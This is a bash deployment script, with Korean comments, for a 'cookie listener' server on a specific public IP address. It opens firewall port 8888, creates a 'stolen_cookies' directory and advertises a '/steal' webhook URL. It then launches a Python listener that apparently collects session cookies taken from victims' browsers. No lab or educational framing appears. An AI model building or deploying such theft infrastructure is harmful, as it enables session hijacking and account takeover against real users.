#!/bin/bash
# 쿠키 리스너 서버 배포 스크립트 (3.113.201.239에서 실행)

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

echo -e "${BLUE}════════════════════════════════════════════════${NC}"
echo -e "${BLUE}   Cookie Listener Server Deployment${NC}"
echo -e "${BLUE}════════════════════════════════════════════════${NC}\n"

# 1. 의존성 확인
echo -e "${YELLOW}[*] Checking dependencies...${NC}"
if ! command -v python3 &> /dev/null; then
    echo -e "${RED}❌ Python3 not found${NC}"
    exit 1
fi

python3 -c "import flask" 2>/dev/null || {
    echo -e "${YELLOW}[*] Installing Flask...${NC}"
    pip3 install flask
}

echo -e "${GREEN}✓ Dependencies OK${NC}\n"

# 2. 방화벽 확인 및 설정
echo -e "${YELLOW}[*] Checking firewall...${NC}"
if command -v ufw &> /dev/null; then
    sudo ufw status | grep -q "8888.*ALLOW" || {
        echo -e "${YELLOW}[*] Opening port 8888...${NC}"
        sudo ufw allow 8888/tcp
        echo -e "${GREEN}✓ Port 8888 opened${NC}"
    }
fi

# 3. 디렉토리 생성
mkdir -p stolen_cookies
echo -e "${GREEN}✓ Cookie storage directory created${NC}\n"

# 4. 서버 시작
echo -e "${BLUE}════════════════════════════════════════════════${NC}"
echo -e "${BLUE}   Starting Cookie Listener Server${NC}"
echo -e "${BLUE}════════════════════════════════════════════════${NC}\n"

echo -e "${GREEN}📡 Server will listen on: http://0.0.0.0:8888${NC}"
echo -e "${GREEN}🔗 Webhook URL: http://3.113.201.239:8888/steal${NC}\n"

echo -e "${YELLOW}Press Ctrl+C to stop the server${NC}\n"

# nohup으로 백그라운드 실행하려면:
# nohup python3 cookie_listener.py > listener.log 2>&1 &
# echo $! > listener.pid

# 포그라운드 실행
python3 cookie_listener.py
